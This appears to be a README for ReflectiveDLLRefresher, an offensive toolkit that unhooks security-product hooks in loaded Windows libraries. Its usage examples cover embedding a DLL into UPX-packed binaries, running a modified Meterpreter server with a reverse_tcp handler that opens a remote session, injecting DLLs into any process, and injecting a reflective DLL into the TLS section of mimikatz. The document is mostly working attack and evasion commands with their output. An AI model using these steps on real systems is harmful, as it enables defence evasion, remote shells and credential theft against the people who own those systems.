# ReflectiveDLLRefresher

# Usage

## DLLRefresher
`DLLRefresher.exe` is a standalone test harness for scanning the process's memory space and unhooking the currently loaded libraries.

## UPX
The packaged UPX binaries have been modified to support an additional parameter (`-X <path/to/target.dll>`) to embed into the packed binary.  The final UPX packed binary will unpack the target executable in memory and call the embedded DLL before jumping into the executable's original entry point.

The modified UPX source can be found @ https://github.com/CylanceVulnResearch/upx/tree/reflective_dll

Usage:
```
upx -o <output filename> -X <path/to/embed.dll> <target executable>
```

Example:
```
upx -o packed_binary.exe -X ReflectiveDLL.x86.dll target_binary.exe
```

## Meterpreter
The `metsrv.dll` (and associated plugins in the `meterpreter` folder) is a modified meterpreter server which will unhook the currently loaded libraries before running meterpreter initalization.

Usage:

Copy all DLLs from the `meterpreter` folder into `metasploit-framework/data/meterpreter/` and get meterpreter execution on target as normal.

Example:
```
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(handler) > run
[*] Started reverse TCP handler on 10.10.10.171:4444
[*] Starting the payload handler...
WARNING: Local file /usr/share/metasploit-framework/data/meterpreter/metsrv.x64.dll is being used
[*] Sending stage (1195055 bytes) to 10.10.10.186
[*] Meterpreter session 1 opened (10.10.10.171:4444 -> 10.10.10.186:58657) at 2016-10-03 10:07:39 -0400
WARNING: Local file /usr/share/metasploit-framework/data/meterpreter/ext_server_stdapi.x64.dll is being used
meterpreter > WARNING: Local file /usr/share/metasploit-framework/data/meterpreter/ext_server_priv.x64.dll is being used
```

## Inject
`Inject.exe` is a helper utilty to inject a given DLL into any process.

Usage:
```
Inject.exe <pid> <filename>
```

Example:
```
Inject.exe 2964 ReflectiveDLLRefresher.x86.dll
[+] Injected the 'ReflectiveDLLRefresher.x86.dll' DLL into process 2964.
```

## DLL
The DLL can be injected through a meterpreter session using the `post/windows/manage/reflective_dll_inject` module.

Usage:
```
msf > use post/windows/manage/reflective_dll_inject
msf post(reflective_dll_inject) > set PATH /path/to/ReflectiveDLLRefresher.x86.dll
msf post(reflective_dll_inject) > set SESSION <session-id>
msf post(reflective_dll_inject) > set PID <pid of meterpreter session>
msf post(reflective_dll_inject) > run
```

Example:
```
msf > use post/windows/manage/reflective_dll_inject
msf post(reflective_dll_inject) > set PATH /path/to/ReflectiveDLLRefresher.x86.dll
msf post(reflective_dll_inject) > set SESSION 1
msf post(reflective_dll_inject) > set PID 4068
msf post(reflective_dll_inject) > run

[*] Running module against WIN10DEV
[*] Injecting /root/ReflectiveDLLRefresher.x86.dll into 4068 ...
[*] DLL injected. Executing ReflectiveLoader ...
[+] DLL injected and invoked.
[*] Post module execution completed
```

## TLS Injector
`tlsInjector.py` is a modified veresion of Borja Merino's script to support reflective DLL injection.  It will take a reflective DLL and inject it into the TLS section of a 32-bit executable (64-bit is not supported).

Usage:
```
python tlsInjector.py -l <path/to/embed.dll> -f <target executable> -o <output filename> -t
```

Example:
```
python tlsInjector.py -l ReflectiveDLLRefresher.x86.dll -f mimikatz.exe -o mimikatz_tls.exe -t
```
